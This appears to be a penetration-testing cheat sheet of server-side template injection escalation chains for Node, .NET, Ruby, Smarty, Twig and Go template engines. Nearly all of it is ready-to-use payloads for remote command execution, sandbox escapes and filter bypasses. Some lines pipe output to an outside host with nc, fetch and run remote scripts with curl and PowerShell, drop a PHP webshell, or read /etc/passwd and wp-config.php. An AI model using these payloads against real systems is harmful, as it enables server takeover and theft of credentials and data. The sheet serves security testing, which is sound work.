# Node / .NET / Ruby / Smarty / Twig SSTI escalation chains — Open WHEN: you have fingerprinted a Node (Pug/Jade/JsRender/Handlebars, vm2/isolated-vm), .NET (Razor/ASP), Ruby (ERB/Slim), Smarty or Twig sink and the body's one-liner is filtered or sandboxed

The body already has the basic EJS/Pug/Nunjucks/Handlebars one-liners, the
`constructor.constructor` traversal, Razor `Process.Start`, and the Twig
`filter('system')` / `_self` lines. Use this for the chains it omits.

## Node — universal expression bodies (wrap in the engine's tag)
One inner expression works across DotJS, EJS, PugJS, UnderscoreJS, Eta — just
wrap in the right delimiter (`<%= %>`, `#{}`, `{{= }}`). Nunjucks runs them via
`{{range.constructor('...')()}}`. Pick the channel that matches the sink:
```
global.process.mainModule.require("child_process").execSync("id").toString()                         # Rendered
global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())   # Error-Based (cmd output in the error)
[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id",{shell:true}).status===0)]["length"]          # Boolean-Based (exit code → 200/500)
global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()               # Time-Based
```
Lodash `_.template` (delimiter set by `options.evaluate`, often `{{ }}`) — direct `spawn_sync` gadget needs no `require`:
```
{{= _.templateSettings.evaluate }}    # fingerprint: leaks the evaluate regex
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

## Node — Jade/Jade-step-form, JsRender, vm2/isolated-vm escape
Jade as ordered code lines (works where inline `#{...}` is stripped):
```
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc OOB.example.net 80')
```
Jade direct read:
```
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
JsRender server-side (`{{:...}}` evaluate tag):
```
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
vm2 / isolated-vm escape — the expression context still leaks `this.process.mainModule.require`, so OS commands run even when "Execute Command" nodes are disabled (n8n-class CVE-2026-21858):
```
={{ (function() {
  const require = this.process.mainModule.require;
  return require("child_process").execSync("id").toString();
})() }}
```
PugJs IIFE form (when the body's plain `#{...}` is filtered):
```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl OOB.example.net/s.sh | bash')}()}
```
Handlebars path-traversal → require arbitrary JS (alternative to the body's gadget): POST `{"profile":{"layout":"./../routes/index.js"}}`.

## .NET — reflection bypass (classes blacklisted / not in assembly)
Load a DLL at runtime, then invoke `Process` — defeats `Process` blacklists:
```
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?")).GetType("System.Diagnostics.Process").GetMethods().GetValue(0).Invoke(null, "/bin/bash,-c ""whoami""".Split(","))}
```
Load DLL straight from the request (no filesystem write): `GetMethod("Load",[typeof(byte[])]).Invoke(null,[Convert.FromBase64String("...")])`.
Classic ASP (`<%= ... %>`) command exec:
```
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://OOB/shell.ps1')").StdOut.ReadAll() %>
```

## Ruby — ERB full set & Slim
ERB beyond the body's `system('id')`:
```
<%= Dir.entries('/') %>
<%= IO.popen('ls /').readlines() %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
```
Slim (`{ ... }` delimiter, `%x|...|` runs a shell):
```
{ %x|env| }
```
Mojolicious (Perl, ERB-style tags): `<%= 7*7 %>` → 49, then `<% perl code %>`.

## Smarty (PHP) — version + write-file webshell
```
{$smarty.version}                                                              # fingerprint
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}   # drop webshell
{system('cat index.php')}                                                      # compatible v3 (deprecated v5)
```
Charless `id` (filter blocks the literal `id`) — concatenate char codes with the `cat` modifier:
```
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```
Blade (Laravel) uses the same idea with PHP `.` concatenation:
```
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

## Twig (PHP) — undefined-filter-callback RCE & filter chains
Beyond the body's `filter('system')`, register an arbitrary PHP callback:
```
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
Whitespace-free command (no literal spaces survive): `{{['cat$IFS/etc/passwd']|filter('system')}}` or `{{['cat\x20/etc/passwd']|filter('system')}}`.
Silence PHP warnings so automated chains don't break: `{{["error_reporting","0"]|sort("ini_set")}}`.
Load a remote template over a controlled FTP channel: `{{_self.env.setCache("ftp://OOB.example.net:2121")}}{{_self.env.loadTemplate("poc")}}`.
File read without RCE (quieter): `{{include("wp-config.php")}}`, `{{include("/etc/passwd")}}`.
Quote-less filename (filter strips string literals) — point `include` at a dump slice; tune OFFSET:LENGTH to where your `FILENAME` text lands:
```
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```

Modern-Twig RCE (the `registerUndefinedFilterCallback`/`_self.env` path is removed in newer Twig; these `map`/`reduce`/`call_user_func` forms still work):
```
{{['id']|map('system')|join}}                                          # >=1.x map
{{[0]|reduce('system','id')}}                                          # reduce
{{['id',1]|sort('system')|join}}                                       # sort callback
{{ {'id':'shell_exec'}|map('call_user_func')|join }}                   # survives "abort on warning" configs
{{[0]|map(["xx", {"id":"shell_exec"}|map("call_user_func")|join]|join)}}   # Error-Based RCE, Twig >=1.41/2.10/3.0
{{1/({"id && echo MARK":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "MARK")}}   # Boolean-Based RCE
```
CVE-2022-23614 sandbox-bypass chain (Error-Based): `{% set a = ["error_reporting","1"]|sort("ini_set") %}{% set b = ["ob_start","call_user_func"]|sort("call_user_func") %}{{ ["id",0]|sort("system") }}{% set a = ["ob_end_flush",[]]|sort("call_user_func_array")%}`.
Obfuscation with no quoted command literal (uses `_charset`/block, then split/map):
```
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```
Double-rendering targets only (engine renders output a second time):
```
{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
```
Email/validator-friendly form (passes `FILTER_VALIDATE_EMAIL`, command in `?0=`):
`email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@OOB.example.net` with `POST /subscribe?0=cat+/etc/passwd`.

## Go `text/template` — define/invoke bypasses html-escaping
`text/template` allows calling any exported method via `call`; `html/template` does not but you can still define+invoke to dodge encoding:
```
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
{{ .System "ls" }}      # only if the context object exposes a command-running method
```
